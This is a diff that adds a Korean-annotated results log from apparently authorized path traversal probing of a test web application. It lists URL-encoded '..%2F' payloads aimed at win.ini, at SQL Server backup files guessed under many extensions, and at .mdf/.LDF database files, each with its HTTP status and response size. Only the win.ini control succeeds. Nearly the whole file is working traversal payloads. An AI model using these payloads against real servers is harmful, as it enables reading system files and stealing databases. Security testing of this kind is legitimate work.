@@ -1,0 +1,85 @@
+### 0. 대조군 먼저 (이게 실패하면 아래 결과는 전부 '미상'으로 취급)
+  [★도달] 대조군 win.ini (Round 7 에서 200 확인됨)
+        ..%2F..%2FWindows%2Fwin.ini
+        → 200 size=2739
+
+### 1. 백업 파일 (physical_device_name 원문 + 확장자 변형)
+  [   -  ] 원문 그대로(확장자 없음)
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021
+        → 500 size=1208
+  [   -  ] 확장자 추정 .bak
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.bak
+        → 500 size=1208
+  [   -  ] 확장자 추정 .trn
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.trn
+        → 500 size=1208
+  [   -  ] 확장자 추정 .zip
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.zip
+        → 500 size=1208
+  [   -  ] 확장자 추정 .7z
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.7z
+        → 500 size=1208
+  [   -  ] 확장자 추정 .rar
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.rar
+        → 500 size=1208
+  [   -  ] 확장자 추정 .sql
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.sql
+        → 500 size=1208
+  [   -  ] 확장자 추정 .txt
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facublog_1apr2021.txt
+        → 500 size=1208
+
+### 2. 다른 DB 백업 파일명 추정 (같은 패턴/디렉터리)
+  [   -  ] acuforum_1apr2021
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuforum_1apr2021
+        → 500 size=1208
+  [   -  ] acuforum_1apr2021.bak
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuforum_1apr2021.bak
+        → 500 size=1208
+  [   -  ] acuservice_1apr2021
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuservice_1apr2021
+        → 500 size=1208
+  [   -  ] acuservice_1apr2021.bak
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuservice_1apr2021.bak
+        → 500 size=1208
+  [   -  ] acuforum_1apr2021
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuforum_1apr2021
+        → 500 size=1208
+  [   -  ] acuforum_1apr2021.bak
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuforum_1apr2021.bak
+        → 500 size=1208
+  [   -  ] acuservice_1apr2021
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuservice_1apr2021
+        → 500 size=1208
+  [   -  ] acuservice_1apr2021.bak
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio%2Facuservice_1apr2021.bak
+        → 500 size=1208
+
+### 3. 백업 디렉터리 상위/자체
+  [   -  ] 상위 Databases 디렉터리
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases
+        → 500 size=1208
+  [   -  ] 백업 디렉터리 자체
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021%2FDatabases%2FBackup_from_Management_Studio
+        → 500 size=1208
+
+### 4. SQL DATA 디렉터리의 DB 파일 (내용은 읽지 않음 — 실존만)
+  [   -  ] DATA\acuforum.mdf
+        ..%2F..%2FProgram%20Files%2FMicrosoft%20SQL%20Server%2FMSSQL12.SQL%2FMSSQL%2FDATA%2Facuforum.mdf
+        → 500 size=1208
+  [   -  ] DATA\acuforum_log.LDF
+        ..%2F..%2FProgram%20Files%2FMicrosoft%20SQL%20Server%2FMSSQL12.SQL%2FMSSQL%2FDATA%2Facuforum_log.LDF
+        → 500 size=1208
+  [   -  ] DATA\acublog.mdf
+        ..%2F..%2FProgram%20Files%2FMicrosoft%20SQL%20Server%2FMSSQL12.SQL%2FMSSQL%2FDATA%2Facublog.mdf
+        → 500 size=1208
+  [   -  ] DATA\acuservice.mdf
+        ..%2F..%2FProgram%20Files%2FMicrosoft%20SQL%20Server%2FMSSQL12.SQL%2FMSSQL%2FDATA%2Facuservice.mdf
+        → 500 size=1208
+
+### 5. 백업 디렉터리 경로 자체가 존재하는지 (파일명 없이 디렉터리 접근은 500 예상)
+  [   -  ] 최상위 Backup_... 디렉터리
+        ..%2F..%2FBackup_testasp_testaspnet_1apr2021
+        → 500 size=1208
+
+### 완료 — 도달 0/23건, 총 요청 24건 → out/backup_paths3.json
